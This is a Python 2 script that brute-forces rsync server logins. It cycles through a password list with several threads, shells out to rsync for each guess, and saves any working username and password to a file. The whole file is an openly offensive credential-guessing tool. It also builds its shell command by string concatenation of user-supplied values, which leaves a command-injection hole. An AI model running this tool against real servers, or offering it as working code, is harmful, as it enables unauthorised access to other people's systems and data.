#!/usr/bin/env python
#coding:utf8
"""
bruteforce rsync with single username and mutli password
python rsync_brute.py -h host -p path -l username -P pass_file
"""

import os
import sys
import getopt
import re
import time
import multiprocessing
import Queue
import threading


queue = Queue.Queue()
host = ''
path = ''

def bruteforce(queue, username):
	
	while True:
		time.sleep(1)
		try:
			if queue.empty():
				break
			queue_task = queue.get()

			print 'Start scan',queue_task
			start = time.clock()
		except Exception,e:
			print e
			break
		try:
			output = open(queue_task, 'w')
			output.write(queue_task)
			output.close()
			cmd = 'chmod 700 '+queue_task
			foutput = os.popen(cmd)
			time.sleep(0.3)

			cmd = 'rsync -v rsync://'+username+'@'+host+'/'+path+' --password-file='+queue_task
			foutput = os.popen(cmd)
			result = foutput.read()

			print result
			try:
				os.remove(queue_task)
			except Exception, e:
				pass

			end = time.clock()
			if result.find('receiving file list') != -1:
				print '\033[1;32;42m'
				print 'Correct:',username,'/',queue_task
				print '\033[0m'
				output = open(host+'_rsync', 'w')
				output.write(username+'/'+queue_task+'\n')
				output.write(result)
				output.close()
				#clear and quit
				queue.clear()

		except Exception,e:
			continue


def main(username, pass_file):
	f = open(pass_file)
	info = []
	#thread counts
	m_count = 4

	while 1:
		host = f.readline()
		if not host:
			break
		info.append(host.strip())

	for i in info:
		queue.put(i)
		#print i


	for i in range(m_count):
		t = threading.Thread(target=bruteforce, args=(queue,username))
		# t.setDaemon(True)
		t.start()
	


if __name__ == '__main__':
	username = ''
	pass_file = ''
	options,args = getopt.getopt(sys.argv[1:],"h:l:p:P:")

	for opt,arg in options:
		if opt == '-h':
			host = arg
		if opt == '-l':
			username = arg
		if opt == '-p':
			path = arg
		if opt == '-P':
			pass_file = arg

	if not os.path.exists(pass_file) or not host or not username:
		#print '\033[1;31;40m'
		print 'python rsync_brute.py -h host -p path -l username -P pass_file'
		#print '\033[0m'
		sys.exit()


	main(username, pass_file)
